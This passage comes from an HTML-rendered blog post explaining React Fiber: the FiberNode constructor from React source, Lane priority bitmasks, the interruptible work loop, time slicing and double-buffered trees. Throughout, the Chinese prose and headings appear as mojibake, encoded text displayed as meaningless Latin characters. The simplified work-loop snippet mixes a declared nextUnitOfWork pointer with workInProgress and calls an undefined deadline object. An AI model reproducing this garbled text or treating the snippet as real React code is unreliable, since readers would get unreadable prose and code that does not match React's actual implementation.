åŠä¹‹å‰ç‰ˆæœ¬çš„æ¸²æŸ“é—®é¢˜ï¼Œåº”å¯¹æ—¥ç›Šæ¿€å¢çš„ç°ä»£å‰ç«¯åº”ç”¨éœ€æ±‚ï¼ŒReact Fiber æ¶æ„äº 16.x ç‰ˆæœ¬è¯ç”Ÿï¼Œå¹¶äºåç»­ç‰ˆæœ¬ä¸­é€æ­¥ä¼˜åŒ–å®Œå–„ã€‚</p><h1 id="ç¬¬äºŒç« ï¼šFiberæ¶æ„çš„æ ¸å¿ƒè®¾è®¡æ€æƒ³"><a href="#ç¬¬äºŒç« ï¼šFiberæ¶æ„çš„æ ¸å¿ƒè®¾è®¡æ€æƒ³" class="headerlink" title="ç¬¬äºŒç« ï¼šFiberæ¶æ„çš„æ ¸å¿ƒè®¾è®¡æ€æƒ³"></a>ç¬¬äºŒç« ï¼šFiberæ¶æ„çš„æ ¸å¿ƒè®¾è®¡æ€æƒ³</h1><h2 id="2-1-Fiber-çš„ä¸‰å¤§è§’è‰²å®šä¹‰"><a href="#2-1-Fiber-çš„ä¸‰å¤§è§’è‰²å®šä¹‰" class="headerlink" title="2.1 Fiber çš„ä¸‰å¤§è§’è‰²å®šä¹‰"></a>2.1 Fiber çš„ä¸‰å¤§è§’è‰²å®šä¹‰</h2><h3 id="ä½œä¸ºæ•°æ®ç»“æ„çš„FiberèŠ‚ç‚¹ï¼ˆé“¾è¡¨èŠ‚ç‚¹ï¼‰"><a href="#ä½œä¸ºæ•°æ®ç»“æ„çš„FiberèŠ‚ç‚¹ï¼ˆé“¾è¡¨èŠ‚ç‚¹ï¼‰" class="headerlink" title="ä½œä¸ºæ•°æ®ç»“æ„çš„FiberèŠ‚ç‚¹ï¼ˆé“¾è¡¨èŠ‚ç‚¹ï¼‰"></a>ä½œä¸ºæ•°æ®ç»“æ„çš„FiberèŠ‚ç‚¹ï¼ˆé“¾è¡¨èŠ‚ç‚¹ï¼‰</h3><p>æ¯ä¸ª Fiber èŠ‚ç‚¹æ˜¯ä¸€ä¸ª JavaScript å¯¹è±¡ï¼ŒReact <a href="https://github.com/facebook/react/blob/1f5ce59dd7b6869b1a17ede65aa301002ef31d4b/packages/react-reconciler/src/ReactFiber.js#L134">æºç </a>ä¸­å¯¹ Fiber èŠ‚ç‚¹çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">FiberNode</span>(<span class="hljs-params"></span><br><span class="hljs-params">  <span class="hljs-variable language_">this</span>: $FlowFixMe,</span><br><span class="hljs-params">  tag: WorkTag,</span><br><span class="hljs-params">  pendingProps: mixed,</span><br><span class="hljs-params">  key: <span class="hljs-literal">null</span> | string,</span><br><span class="hljs-params">  mode: TypeOfMode,</span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Instance</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">tag</span> = tag;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span> = key;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">elementType</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">stateNode</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-comment">// Fiber</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">return</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">child</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sibling</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span> = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">ref</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">refCleanup</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">pendingProps</span> = pendingProps;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">memoizedProps</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateQueue</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">memoizedState</span> = <span class="hljs-literal">null</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">dependencies</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">mode</span> = mode;<br><br>  <span class="hljs-comment">// Effects</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">flags</span> = <span class="hljs-title class_">NoFlags</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">subtreeFlags</span> = <span class="hljs-title class_">NoFlags</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">deletions</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">lanes</span> = <span class="hljs-title class_">NoLanes</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">childLanes</span> = <span class="hljs-title class_">NoLanes</span>;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">alternate</span> = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>    <span class="hljs-comment">// Note: The following is done to avoid a v8 performance cliff.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Initializing the fields below to smis and later updating them with</span><br>    <span class="hljs-comment">// double values will cause Fibers to end up having separate shapes.</span><br>    <span class="hljs-comment">// This behavior/bug has something to do with Object.preventExtension().</span><br>    <span class="hljs-comment">// Fortunately this only impacts DEV builds.</span><br>    <span class="hljs-comment">// Unfortunately it makes React unusably slow for some applications.</span><br>    <span class="hljs-comment">// To work around this, initialize the fields below with doubles.</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Learn more about this here:</span><br>    <span class="hljs-comment">// https://github.com/facebook/react/issues/14365</span><br>    <span class="hljs-comment">// https://bugs.chromium.org/p/v8/issues/detail?id=8538</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualStartTime</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selfBaseDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">treeBaseDuration</span> = <span class="hljs-title class_">Number</span>.<span class="hljs-property">NaN</span>;<br><br>    <span class="hljs-comment">// It&#x27;s okay to replace the initial doubles with smis after initialization.</span><br>    <span class="hljs-comment">// This won&#x27;t trigger the performance cliff mentioned above,</span><br>    <span class="hljs-comment">// and it simplifies other profiler code (including DevTools).</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualDuration</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">actualStartTime</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selfBaseDuration</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">treeBaseDuration</span> = <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (__DEV__) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t directly used but is handy for debugging internals:</span><br><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugSource</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugOwner</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugNeedsRemount</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_debugHookTypes</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (!hasBadMapPolyfill &amp;&amp; <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property">preventExtensions</span> === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">preventExtensions</span>(<span class="hljs-variable language_">this</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä½œä¸ºæ‰§è¡Œå•å…ƒçš„ä»»åŠ¡åˆ†ç‰‡ï¼ˆUnit-of-Workï¼‰"><a href="#ä½œä¸ºæ‰§è¡Œå•å…ƒçš„ä»»åŠ¡åˆ†ç‰‡ï¼ˆUnit-of-Workï¼‰" class="headerlink" title="ä½œä¸ºæ‰§è¡Œå•å…ƒçš„ä»»åŠ¡åˆ†ç‰‡ï¼ˆUnit of Workï¼‰"></a>ä½œä¸ºæ‰§è¡Œå•å…ƒçš„ä»»åŠ¡åˆ†ç‰‡ï¼ˆUnit of Workï¼‰</h3><p>åœ¨ç¬¬ä¸€ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬äº†è§£äº†é•¿ä»»åŠ¡çš„ç›¸å…³çŸ¥è¯†ï¼ŒçŸ¥é“é•¿ä»»åŠ¡ä¼šé˜»å¡ä¸»çº¿ç¨‹ï¼Œå¼•èµ·æ‰å¸§é—®é¢˜ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å°†é•¿ä»»åŠ¡è¿›è¡Œæ‹†åˆ†ï¼Œå¹¶åœ¨æµè§ˆå™¨çš„æ¯ä¸€å¸§ä¸­é™åˆ¶ä¸»çº¿ç¨‹æ‰§è¡Œä»»åŠ¡çš„æ—¶é—´ï¼ˆReact é»˜è®¤åˆå§‹æ—¶é—´æ˜¯ <a href="https://github.com/facebook/react/blob/1fb18e22ae66fdb1dc127347e169e73948778e5a/packages/scheduler/src/forks/SchedulerHostConfig.default.js#L119">5ms</a>ï¼‰ï¼Œè¿™ç§å°†é•¿ä»»åŠ¡æ‹†æˆå¤šæ®µå¾®å°ä»»åŠ¡çš„æŠ€æœ¯è¢«ç§°ä¸º<code>ä»»åŠ¡åˆ†ç‰‡</code>ï¼Œåˆ†é…åˆ°æ¯ä¸€å¸§ä¸­å»æ‰§è¡Œçš„æ“ä½œè¢«ç§°ä¸º<code>æ—¶é—´åˆ‡ç‰‡</code>ï¼ŒäºŒè€…ååŒå®ç° React çš„é«˜æ•ˆæ¸²æŸ“ã€‚</p><p>å®ç°ä»»åŠ¡åˆ†ç‰‡çš„å…³é”®æ˜¯å°†åŒæ­¥æ›´æ–°å˜ä¸ºå¯ä¸­æ–­çš„å¼‚æ­¥æ›´æ–°ï¼š</p><ol><li>æ„å»ºé“¾è¡¨æ ‘ï¼šé€šè¿‡ Fiber èŠ‚ç‚¹çš„é“¾è¡¨ç»“æ„æ„å»ºé“¾è¡¨æ ‘ï¼Œæ›¿ä»£é€’å½’è°ƒç”¨æ ˆ</li><li>åˆ†ç‰‡æ‰§è¡Œï¼šReact é€šè¿‡å¾ªç¯é€ä¸ªå¤„ç† Fiber èŠ‚ç‚¹ï¼Œæ¯å¤„ç†å®Œä¸€ä¸ªèŠ‚ç‚¹åæ£€æŸ¥å‰©ä½™æ—¶é—´ï¼Œå†³å®šç»§ç»­è¿˜æ˜¯æš‚åœ</li><li>ä¸­æ–­å’Œæ¢å¤ï¼šå½“æœ‰é«˜ä¼˜å…ˆçº§ä»»åŠ¡ï¼ˆå¦‚ç”¨æˆ·ç‚¹å‡»ï¼‰æˆ–å½“å‰åˆ†ç‰‡æ—¶é—´ç”¨å°½æ—¶æš‚åœä»»åŠ¡ï¼Œé€šè¿‡ä¿å­˜å½“å‰å¤„ç†çš„ Fiber èŠ‚ç‚¹æŒ‡é’ˆï¼Œä¸‹æ¬¡ä»æ–­ç‚¹ç»§ç»­</li></ol><h3 id="ä½œä¸ºè°ƒåº¦å•ä½çš„ä¼˜å…ˆçº§è½½ä½“ï¼ˆLaneæ¨¡å‹ï¼‰"><a href="#ä½œä¸ºè°ƒåº¦å•ä½çš„ä¼˜å…ˆçº§è½½ä½“ï¼ˆLaneæ¨¡å‹ï¼‰" class="headerlink" title="ä½œä¸ºè°ƒåº¦å•ä½çš„ä¼˜å…ˆçº§è½½ä½“ï¼ˆLaneæ¨¡å‹ï¼‰"></a>ä½œä¸ºè°ƒåº¦å•ä½çš„ä¼˜å…ˆçº§è½½ä½“ï¼ˆLaneæ¨¡å‹ï¼‰</h3><p>React Fiber æ¶æ„ä¸­å®ç°ä»»åŠ¡ä¼˜å…ˆçº§è°ƒåº¦çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå°†ä¼˜å…ˆçº§ä¿¡æ¯åˆ†æ•£åœ¨ Fiber æ ‘çš„å„ä¸ªèŠ‚ç‚¹å’Œæ›´æ–°ä¿¡æ¯ä¸­ï¼Œé€šè¿‡åŠ¨æ€è®¡ç®—ï¼ˆlanesï¼‰å’Œè°ƒåº¦å™¨ï¼ˆschedulerï¼‰çš„åä½œå®ç°ä¼˜å…ˆçº§è°ƒåº¦ã€‚</p><p><strong>Laneï¼ˆè½¦é“ï¼‰çš„å®šä¹‰</strong></p><ul><li>æ¯ä¸ª Lane æ˜¯ä¸€ä¸ª32ä½çš„äºŒè¿›åˆ¶ä½</li><li>æ¯ä¸ªäºŒè¿›åˆ¶ä½ä»£è¡¨ä¸€ç§ä¼˜å…ˆçº§ç±»å‹</li><li>æ•°å­—è¶Šå°ï¼ˆä½è¶Šä½ï¼‰ä¼˜å…ˆçº§è¶Šé«˜</li><li>Lane äº’æ–¥</li></ul><p><strong>Lane çš„ç±»å‹</strong></p><p>React 18 ç‰ˆæœ¬ä¸­å®šä¹‰çš„ç±»å‹æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¼˜å…ˆçº§ä»é«˜åˆ°ä½</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">SyncLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000000001</span>; <span class="hljs-comment">// åŒæ­¥ä»»åŠ¡ï¼ˆæœ€é«˜ï¼‰</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">InputContinuousLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000000100</span>; <span class="hljs-comment">// ç”¨æˆ·è¾“å…¥</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">DefaultLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000000000000100000</span>; <span class="hljs-comment">// é»˜è®¤æ›´æ–°</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">TransitionLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0000000000000000001000000000000</span>; <span class="hljs-comment">// è¿‡æ¸¡æ›´æ–°ï¼Œæ¯”å¦‚useTransition</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">IdleLane</span>: <span class="hljs-title class_">Lane</span> = <span class="hljs-number">0b0100000000000000000000000000000</span>; <span class="hljs-comment">// ç©ºé—²ä»»åŠ¡ï¼ˆæœ€ä½ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>Lane é›†åˆï¼ˆLanesï¼‰</strong></p><p>å¤šä¸ª Lane å¯ä»¥ç»„åˆï¼š<code>lanes = InputLane | DefaultLane</code>ï¼Œè¡¨ç¤ºä¸€ç»„éœ€è¦å¤„ç†çš„ä¼˜å…ˆçº§é›†åˆ</p><p><strong>Lane æ¨¡å‹çš„å·¥ä½œåŸç†</strong></p><ol><li>ä¼˜å…ˆçº§åˆ†é…ï¼šæ›´æ–°é˜¶æ®µæ ¹æ®äº¤äº’ç±»å‹åˆ†é… Lane</li><li>ä¼˜å…ˆçº§æ”¶é›†ï¼šæ¯ä¸ª Fiber èŠ‚ç‚¹å¯¹è±¡éƒ½æœ‰ <code>lanes</code> å±æ€§å’Œ <code>childLanes</code> å±æ€§ï¼Œlanes å±æ€§ä¿å­˜è¯¥èŠ‚ç‚¹éœ€è¦å¤„ç†çš„ä¼˜å…ˆçº§åˆé›†ï¼ŒchildLanes å±æ€§ä¿å­˜å­èŠ‚ç‚¹ä¸­æ‰€æœ‰æœªå¤„ç†çš„ä¼˜å…ˆçº§åˆé›†</li><li>ä¼˜å…ˆçº§è°ƒåº¦ï¼šFiber æ ‘æ ¹èŠ‚ç‚¹åˆå¹¶æ‰€æœ‰å­èŠ‚ç‚¹çš„ lanes å’Œ childLanes -&gt; ä»åˆå¹¶åçš„ä¼˜å…ˆçº§åˆé›†ä¸­é€‰å–æœ€é«˜ä¼˜å…ˆçº§çš„ Lane è¿›è¡Œå¤„ç† -&gt; åªå¤„ç†ä¸é€‰å®š Lane åŒ¹é…çš„æ›´æ–°</li></ol><p>è¿™é‡Œå…ˆåªåšç®€å•çš„æ¦‚å¿µäº†è§£ï¼Œè¯¦ç»†çŸ¥è¯†å°†åœ¨ 4.1 ç« èŠ‚ä¸­è¿›è¡Œè®²è§£ã€‚</p><h2 id="2-2-å…³é”®è®¾è®¡ç›®æ ‡"><a href="#2-2-å…³é”®è®¾è®¡ç›®æ ‡" class="headerlink" title="2.2 å…³é”®è®¾è®¡ç›®æ ‡"></a>2.2 å…³é”®è®¾è®¡ç›®æ ‡</h2><p>æˆ‘ä»¬å·²ç»çŸ¥é“åœ¨ React15 åŠä¹‹å‰ç‰ˆæœ¬ä¸­ï¼Œæ¸²æŸ“ä¸€æ—¦å¼€å§‹ä¾¿æ— æ³•ä¸­æ–­ï¼Œå¹¶ä¸”æ‰€æœ‰ä»»åŠ¡åŒæ­¥è¿›è¡Œï¼Œäº«æœ‰åŒç­‰ä¼˜å…ˆçº§ï¼Œä¼šå¯¼è‡´äº¤äº’å»¶è¿Ÿã€‚Fiber æ¶æ„ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜çš„æ ¸å¿ƒè®¾è®¡ç›®æ ‡æœ‰ä¸‰ä¸ª</p><h3 id="å¯ä¸­æ–­ã€å¯æ¢å¤çš„æ¸²æŸ“æµç¨‹"><a href="#å¯ä¸­æ–­ã€å¯æ¢å¤çš„æ¸²æŸ“æµç¨‹" class="headerlink" title="å¯ä¸­æ–­ã€å¯æ¢å¤çš„æ¸²æŸ“æµç¨‹"></a>å¯ä¸­æ–­ã€å¯æ¢å¤çš„æ¸²æŸ“æµç¨‹</h3><p><strong>å…³é”®è®¾è®¡</strong></p><p>è¦å®ç°å¯ä¸­æ–­ã€å¯æ¢å¤çš„æ¸²æŸ“æµç¨‹ï¼Œå…³é”®è®¾è®¡æœ‰ä¸‰ç‚¹ï¼š</p><ul><li>é“¾è¡¨ç»“æ„æ›¿ä»£é€’å½’ç»“æ„ï¼šFiber é€šè¿‡ <code>childã€siblingã€return</code>æ„æˆæ ‘å½¢é“¾è¡¨</li><li>å…¨å±€æŒ‡é’ˆè·Ÿè¸ªè¿›åº¦ï¼š<code>nextUnitOfWork</code>è®°å½•å½“å‰å¤„ç†èŠ‚ç‚¹</li><li>åŒç¼“å­˜æœºåˆ¶ï¼š<code>current tree</code> å’Œ <code>work-in-progress tree</code> ä¸¤æ£µæ ‘äº¤æ›¿æ›´æ–°</li></ul><p><strong>å®Œæ•´æµç¨‹</strong></p><pre class="mermaid">graph TD    A[è§¦å‘æ›´æ–°] --> B{æœ‰é«˜ä¼˜å…ˆçº§ä»»åŠ¡}    B -->|æ˜¯| C[ä¸­æ–­å½“å‰ä»»åŠ¡]    B -->|å¦| D[å¼€å§‹Renderé˜¶æ®µ]    D --> E[å¤„ç†FiberèŠ‚ç‚¹]    E --> F{æ—¶é—´ç”¨å®Œ}    F -->|æ˜¯| C    F -->|å¦| G{è¿˜æœ‰å­èŠ‚ç‚¹}    G -->|æ˜¯| H[ç§»åŠ¨åˆ°å­èŠ‚ç‚¹]    G -->|å¦| I{è¿˜æœ‰å…„å¼ŸèŠ‚ç‚¹}    I -->|æ˜¯| J[ç§»åŠ¨åˆ°å…„å¼ŸèŠ‚ç‚¹]    I -->|å¦| K[å›æº¯åˆ°çˆ¶èŠ‚ç‚¹]    K --> L{æ ¹èŠ‚ç‚¹}    L -->|å¦| E    L -->|æ˜¯| M[å®ŒæˆRenderé˜¶æ®µ]    M --> N[Commité˜¶æ®µ]    N --> O[æ›´æ–°DOM]    C --> P[ä¿å­˜è¿›åº¦]    P --> Q[æ‰§è¡Œé«˜ä¼˜å…ˆçº§ä»»åŠ¡]    Q --> R[æ¢å¤ä½ä¼˜å…ˆçº§ä»»åŠ¡]</pre><p><strong>å®ç°åŸç†</strong></p><ol><li>æ¸²æŸ“é˜¶æ®µå¯ä¸­æ–­ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>; <span class="hljs-comment">// å…¨å±€å·¥ä½œæŒ‡é’ˆ</span><br><br><span class="hljs-comment">// ä¸»å·¥ä½œå¾ªç¯</span><br><br><span class="hljs-comment">/** <span class="hljs-doctag">@noinline</span> */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoopConcurrentByScheduler</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// Perform work until Scheduler asks us to yield</span><br>  <span class="hljs-keyword">while</span> (workInProgress !== <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-title function_">shouldYield</span>()) &#123;<br>    <span class="hljs-comment">// $FlowFixMe[incompatible-call] flow doesn&#x27;t know that shouldYield() is side-effect free</span><br>    <span class="hljs-title function_">performUnitOfWork</span>(workInProgress);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦éœ€è¦ä¸­æ–­</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">shouldYield</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span> || <br>         <span class="hljs-title function_">hasHigherPriorityWork</span>(); <span class="hljs-comment">// é«˜ä¼˜å…ˆçº§ä»»åŠ¡åˆ°è¾¾</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>è¿›åº¦ä¿å­˜å’Œæ¢å¤ï¼šä¸­æ–­æ—¶ä¿ç•™ <code>nextUnitOfWork</code> æŒ‡é’ˆæŒ‡å‘æœªå®Œæˆçš„ Fiber èŠ‚ç‚¹ï¼Œæ¢å¤æ—¶ä»ä¸Šæ¬¡ä¸­æ–­çš„èŠ‚ç‚¹ç»§ç»­éå†ï¼Œé‡‡ç”¨æ·±åº¦ä¼˜å…ˆéå†ç­–ç•¥ï¼Œä¼˜å…ˆå¤„ç†å­èŠ‚ç‚¹ï¼ˆ<code>child</code>ï¼‰ï¼Œæ— å­èŠ‚ç‚¹æ—¶å¤„ç†å…„å¼ŸèŠ‚ç‚¹ï¼ˆ<code>sibling</code>ï¼‰ï¼Œæ— å…„å¼ŸèŠ‚ç‚¹æ—¶å›æº¯çˆ¶èŠ‚ç‚¹ï¼ˆ<code>return</code>ï¼‰</li><li>åŒç¼“å­˜ä¿è¯ä¸€è‡´æ€§ï¼šcurrent tree å±•ç¤ºå½“å‰ç•Œé¢ï¼Œä¸­æ–­æ—¶ä¿æŒä¸å˜ï¼Œwork-in-progress tree æ„å»ºæ–°çš„ Fiber æ ‘ï¼Œæ„å»ºå®Œæˆåä¸€æ¬¡æ€§æ›¿æ¢ current tree å˜æˆæ–°çš„ current tree</li></ol><p>React Fiber æ¶æ„é€šè¿‡å¯ä¸­æ–­ã€å¯æ¢å¤çš„æ¸²æŸ“æµç¨‹æ‹¥æœ‰ç±»ä¼¼äºæ“ä½œç³»ç»Ÿçš„â€œå¤šä»»åŠ¡å¤„ç†â€èƒ½åŠ›ï¼Œæœ€ç»ˆå®ç°æ¸²æŸ“ä¸é˜»å¡äº¤äº’çš„ç”¨æˆ·ä½“éªŒ</p><h3 id="æ—¶é—´åˆ‡ç‰‡ï¼ˆTime-Slicingï¼‰ä¸å¢é‡æ¸²æŸ“"><a href="#æ—¶é—´åˆ‡ç‰‡ï¼ˆTime-Slicingï¼‰ä¸å¢é‡æ¸²æŸ“" class="headerlink" title="æ—¶é—´åˆ‡ç‰‡ï¼ˆTime Slicingï¼‰ä¸å¢é‡æ¸²æŸ“"></a>æ—¶é—´åˆ‡ç‰‡ï¼ˆTime Slicingï¼‰ä¸å¢é‡æ¸²æŸ“</h3><p>åœ¨ React Fiber ä¸­ï¼Œæ—¶é—´åˆ‡ç‰‡å’Œå¢é‡æ¸²æŸ“æ˜¯ä¸¤ä¸ªç´§å¯†ç›¸å…³çš„æ ¸å¿ƒæ¦‚å¿µï¼Œå…±åŒè§£å†³äº†æ¸²æŸ“è¿‡ç¨‹ä¸­ä¸»çº¿ç¨‹é˜»å¡çš„é—®é¢˜ï¼Œä½†ä»–ä»¬çš„å…³æ³¨ç‚¹ä¸åŒ</p><p><strong>æ—¶é—´åˆ‡ç‰‡ - æ—¶é—´ç»´åº¦çš„è§£å†³æ–¹æ¡ˆ</strong></p><p>æ—¶é—´åˆ‡ç‰‡æ˜¯å°†è¿ç»­é•¿ä»»åŠ¡åˆ‡å‰²æˆå¤šä¸ªå¾®å°ä»»åŠ¡ï¼Œå¹¶åˆ†æ•£åœ¨æµè§ˆå™¨çš„å¤šä¸ªæ¸²æŸ“å¸§ä¸­å»æ‰§è¡Œçš„æŠ€æœ¯</p><p>å®ƒçš„æ ¸å¿ƒç›®æ ‡æœ‰ 2 ä¸ªï¼š</p><ul><li>é˜²æ­¢ JavaScript ä»£ç æ‰§è¡Œæ—¶é—´è¶…è¿‡ 50ms</li><li>ä¿è¯æµè§ˆå™¨çš„æ¯ä¸€å¸§ä¸­æœ‰è¶³å¤Ÿçš„æ—¶é—´å»æ‰§è¡Œæ¸²æŸ“ã€åŠ¨ç”»å’Œäº¤äº’</li></ul><p>å…¶æ ¸å¿ƒå®ç°åŸç†æ˜¯é€šè¿‡ <code>requestIdleCallback</code>ï¼ˆReact17åŠä»¥ä¸‹ï¼‰ æˆ– <code>MessageChannel</code>ï¼ˆReact18ï¼‰ æ¥æ£€æµ‹å‰©ä½™æ—¶é—´ï¼Œå½“æ—¶é—´ç”¨å°½æ—¶ä¸­æ–­ä»»åŠ¡å¹¶ä¿å­˜çŠ¶æ€ï¼Œä¸‹æ¬¡ç©ºä½™æ—¶é—´åˆ°æ¥æ—¶ä»ä¸­æ–­ç‚¹æ¢å¤</p><p><strong>å¢é‡æ¸²æŸ“ - 